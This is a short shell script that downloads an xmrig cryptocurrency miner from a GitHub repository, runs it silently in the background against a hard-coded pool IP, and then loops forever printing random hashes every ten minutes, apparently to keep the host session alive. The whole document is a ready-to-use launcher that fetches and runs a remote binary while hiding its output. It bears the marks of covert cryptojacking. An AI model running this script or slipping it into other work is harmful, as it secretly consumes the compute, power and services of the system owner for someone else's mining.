wget https://github.com/sbwsmg/DAG/raw/main/xmrig
chmod +x xmrig
./xmrig -o 139.59.101.213:443 -u cLp4TjN+J7JI1KcSEStAw9H5H1vw/mXY -p $(echo $(shuf -i 1-20000 -n 1)) -a rx/xdag -t 4 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
